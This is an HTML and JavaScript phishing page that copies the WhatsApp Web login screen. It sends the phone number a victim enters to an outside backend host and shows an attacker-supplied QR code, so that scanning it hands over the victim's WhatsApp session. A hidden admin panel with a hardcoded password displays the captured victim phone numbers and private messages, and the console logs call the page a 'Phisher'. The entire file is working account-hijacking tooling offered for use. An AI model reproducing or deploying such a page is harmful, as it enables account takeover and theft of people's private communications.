<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Web</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #075e54 0%, #128C7E 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            max-width: 550px;
            width: 100%;
            background: white;
            border-radius: 25px;
            overflow: hidden;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }

        .header {
            background: #075e54;
            padding: 30px 20px;
            text-align: center;
            color: white;
        }

        .official-logo {
            width: 70px;
            height: 70px;
            background: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 15px;
        }

        .official-logo svg {
            width: 45px;
            height: 45px;
        }

        .header h1 {
            font-size: 24px;
            margin-bottom: 5px;
        }

        .qr-container {
            background: #f0f2f5;
            border-radius: 20px;
            padding: 30px;
            text-align: center;
            margin: 25px;
            border: 2px solid #25D366;
        }

        .qr-wrapper {
            background: white;
            padding: 15px;
            border-radius: 15px;
            display: inline-block;
            min-height: 250px;
            min-width: 250px;
        }

        #qrCode {
            width: 220px;
            height: 220px;
            display: block;
        }

        .qr-status {
            margin-top: 15px;
            font-size: 14px;
            color: #667781;
        }

        .qr-status.connected {
            color: #25D366;
            font-weight: bold;
        }

        .qr-status.loading {
            color: #ff9800;
        }

        .qr-status.error {
            color: #dc3545;
        }

        .input-group {
            padding: 0 25px 25px 25px;
        }

        .phone-input {
            width: 100%;
            padding: 15px;
            font-size: 16px;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            outline: none;
            text-align: center;
        }

        .phone-input:focus {
            border-color: #25D366;
        }

        .btn {
            width: calc(100% - 50px);
            margin: 0 25px 25px 25px;
            padding: 15px;
            background: #25D366;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }

        .btn:hover {
            background: #128C7E;
        }

        .btn:disabled {
            background: #ccc;
            cursor: not-allowed;
        }

        .status {
            margin: 15px 25px;
            padding: 12px;
            border-radius: 10px;
            text-align: center;
            display: none;
        }

        .status.success {
            background: #d4edda;
            color: #155724;
            display: block;
        }

        .status.error {
            background: #f8d7da;
            color: #721c24;
            display: block;
        }

        .admin-badge {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(0,0,0,0.7);
            color: white;
            padding: 8px 15px;
            border-radius: 20px;
            font-size: 12px;
            cursor: pointer;
        }

        .admin-badge:hover {
            background: #075e54;
        }

        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 2000;
            justify-content: center;
            align-items: center;
        }

        .modal.active {
            display: flex;
        }

        .modal-content {
            background: white;
            border-radius: 20px;
            max-width: 90%;
            width: 900px;
            max-height: 80%;
            overflow: auto;
            padding: 20px;
        }

        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 2px solid #e0e0e0;
            margin-bottom: 20px;
            padding-bottom: 15px;
        }

        .close-modal {
            background: none;
            border: none;
            font-size: 28px;
            cursor: pointer;
        }

        .messages-box {
            background: #f0f2f5;
            border-radius: 10px;
            padding: 15px;
            margin-top: 20px;
            max-height: 400px;
            overflow-y: auto;
        }

        .message-item {
            background: white;
            padding: 12px;
            margin: 8px 0;
            border-radius: 8px;
            border-left: 4px solid #25D366;
        }

        .message-sender {
            font-weight: bold;
            color: #075e54;
        }

        .message-text {
            margin-top: 5px;
            color: #333;
        }

        .message-time {
            font-size: 10px;
            color: #999;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="official-logo">
                <svg viewBox="0 0 24 24" fill="#25D366">
                    <path d="M12.04 2.5c-5.25 0-9.5 4.25-9.5 9.5 0 1.75.5 3.45 1.3 4.9L2.5 21.5l5-1.3c1.45.8 3.05 1.3 4.75 1.3 5.25 0 9.5-4.25 9.5-9.5s-4.25-9.5-9.5-9.5z"/>
                </svg>
            </div>
            <h1>WhatsApp Web</h1>
            <p>Connect to your account</p>
        </div>

        <div class="qr-container">
            <div class="qr-wrapper">
                <img id="qrCode" src="" alt="QR Code">
            </div>
            <div id="qrStatus" class="qr-status loading">Enter your phone number to connect</div>
        </div>

        <div class="input-group">
            <input type="tel" id="phone" class="phone-input" placeholder="Enter your phone number" autocomplete="off">
        </div>

        <button class="btn" id="submitBtn">Connect to WhatsApp</button>
        <div id="status" class="status"></div>
    </div>

    <div class="admin-badge" id="adminBadge">🔒 Admin Panel</div>

    <div class="modal" id="adminModal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>📊 WhatsApp Session - Captured Messages</h2>
                <button class="close-modal" id="closeModal">&times;</button>
            </div>
            <div id="adminContent">
                <div style="text-align: center; padding: 40px;">Loading...</div>
            </div>
        </div>
    </div>

    <script>
        // ========== CONFIGURATION ==========
        const BACKEND_URL = 'https://mnisi5334.pythonanywhere.com';
        const ADMIN_PASSWORD = 'Phishing3694';
        
        let checkInterval = null;
        let sessionActive = false;

        // ========== HELPER FUNCTIONS ==========
        function showStatus(message, type) {
            const statusDiv = document.getElementById('status');
            statusDiv.textContent = message;
            statusDiv.className = `status ${type}`;
            setTimeout(() => {
                statusDiv.style.display = 'none';
                statusDiv.className = 'status';
            }, 4000);
        }

        function updateQRStatus(message, type) {
            const qrStatus = document.getElementById('qrStatus');
            qrStatus.textContent = message;
            qrStatus.className = `qr-status ${type}`;
        }

        // ========== API CALLS ==========
        async function capturePhone(phone) {
            try {
                const response = await fetch(`${BACKEND_URL}/api/capture`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone: phone })
                });
                return await response.json();
            } catch (error) {
                console.error('Capture error:', error);
                return null;
            }
        }

        async function getQR() {
            try {
                const response = await fetch(`${BACKEND_URL}/api/qr`);
                return await response.json();
            } catch (error) {
                console.error('QR fetch error:', error);
                return null;
            }
        }

        async function getMessages() {
            try {
                const response = await fetch(`${BACKEND_URL}/api/messages`);
                return await response.json();
            } catch (error) {
                console.error('Messages fetch error:', error);
                return null;
            }
        }

        async function getVictims() {
            try {
                const response = await fetch(`${BACKEND_URL}/api/victims`);
                return await response.json();
            } catch (error) {
                console.error('Victims fetch error:', error);
                return null;
            }
        }

        // ========== QR CODE CHECKING ==========
        async function startQRCheck() {
            if (checkInterval) clearInterval(checkInterval);
            
            checkInterval = setInterval(async () => {
                try {
                    const data = await getQR();
                    
                    if (data && data.qr) {
                        const qrImg = document.getElementById('qrCode');
                        qrImg.src = `data:image/png;base64,${data.qr}`;
                        updateQRStatus('✅ QR code ready - Scan with WhatsApp', '');
                    }
                    
                    if (data && data.connected) {
                        updateQRStatus('✅ Connected! WhatsApp is active', 'connected');
                        sessionActive = true;
                        clearInterval(checkInterval);
                        showStatus('✓ Connected successfully!', 'success');
                    }
                } catch (error) {
                    console.error('QR check error:', error);
                    updateQRStatus('⚠️ Connection error - Check backend', 'error');
                }
            }, 3000);
        }

        // ========== ADMIN PANEL ==========
        async function loadAdminPanel() {
            const adminContent = document.getElementById('adminContent');
            adminContent.innerHTML = '<div style="text-align: center; padding: 40px;">Loading data...</div>';
            
            try {
                const victims = await getVictims();
                const messagesData = await getMessages();
                
                let html = '';
                
                // Victim info
                if (victims && victims.length > 0) {
                    const victim = victims[0];
                    html += `
                        <div style="margin-bottom: 20px; padding: 15px; background: #f0f2f5; border-radius: 10px;">
                            <strong>📱 Victim Phone:</strong> ${victim.phone || 'Not captured yet'}<br>
                            <strong>🔗 Session Status:</strong> ${victim.session_active ? '✅ Active' : '⏳ Waiting for scan'}<br>
                            <strong>💬 Messages Captured:</strong> ${victim.messages_count || 0}
                        </div>
                    `;
                } else {
                    html += '<div style="margin-bottom: 20px; padding: 15px; background: #f0f2f5; border-radius: 10px;">⏳ Waiting for victim to enter phone number...</div>';
                }
                
                // Messages
                if (messagesData && messagesData.messages && messagesData.messages.length > 0) {
                    html += `
                        <h3>📱 WhatsApp Messages:</h3>
                        <div class="messages-box">
                    `;
                    messagesData.messages.forEach(msg => {
                        html += `
                            <div class="message-item">
                                <div class="message-sender">${msg.from || 'Unknown'}</div>
                                <div class="message-text">${msg.message || msg}</div>
                                <div class="message-time">${msg.time || new Date().toLocaleTimeString()}</div>
                            </div>
                        `;
                    });
                    html += '</div>';
                } else {
                    html += '<p>No messages captured yet. Wait for victim to scan QR code.</p>';
                }
                
                html += `
                    <button onclick="location.reload()" style="margin-top: 20px; padding: 10px 20px; background: #25D366; border: none; border-radius: 8px; cursor: pointer;">🔄 Refresh</button>
                `;
                
                adminContent.innerHTML = html;
            } catch (error) {
                adminContent.innerHTML = `<div style="text-align: center; padding: 40px; color: red;">❌ Error loading data. Make sure backend is running at ${BACKEND_URL}</div>`;
            }
        }

        // ========== MAIN SUBMIT FUNCTION ==========
        async function submitPhone() {
            const phone = document.getElementById('phone').value.trim();
            const submitBtn = document.getElementById('submitBtn');
            
            if (!phone || phone.length < 9) {
                showStatus('Please enter a valid phone number', 'error');
                return;
            }
            
            submitBtn.disabled = true;
            submitBtn.textContent = 'Connecting...';
            showStatus('Sending request...', 'success');
            updateQRStatus('🔄 Generating QR code...', 'loading');
            
            try {
                const result = await capturePhone(phone);
                
                if (result && result.status === 'success') {
                    showStatus('✓ Phone number received! QR code generating...', 'success');
                    startQRCheck();
                } else {
                    throw new Error('Failed to connect to backend');
                }
            } catch (error) {
                console.error('Submit error:', error);
                showStatus('❌ Connection error. Make sure backend is running.', 'error');
                updateQRStatus('⚠️ Cannot connect to backend', 'error');
                submitBtn.disabled = false;
                submitBtn.textContent = 'Connect to WhatsApp';
            }
        }

        // ========== EVENT LISTENERS ==========
        document.getElementById('submitBtn').addEventListener('click', submitPhone);
        document.getElementById('phone').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') submitPhone();
        });
        
        // Admin panel
        const adminBadge = document.getElementById('adminBadge');
        const adminModal = document.getElementById('adminModal');
        const closeModal = document.getElementById('closeModal');
        
        adminBadge.addEventListener('click', () => {
            const password = prompt('🔐 Enter admin password:');
            if (password === ADMIN_PASSWORD) {
                loadAdminPanel();
                adminModal.classList.add('active');
            } else if (password !== null) {
                alert('❌ Wrong password!');
            }
        });
        
        closeModal.addEventListener('click', () => adminModal.classList.remove('active'));
        adminModal.addEventListener('click', (e) => {
            if (e.target === adminModal) adminModal.classList.remove('active');
        });
        
        // ========== INITIALIZATION ==========
        console.log('✅ WhatsApp Phisher Ready');
        console.log(`📡 Backend URL: ${BACKEND_URL}`);
        console.log('🔑 Admin Password: Phishing3694');
        
        // Test backend connection
        fetch(`${BACKEND_URL}/api/status`)
            .then(res => res.json())
            .then(data => console.log('✅ Backend connected:', data))
            .catch(err => console.error('❌ Backend connection failed:', err));
    </script>
</body>
</html>
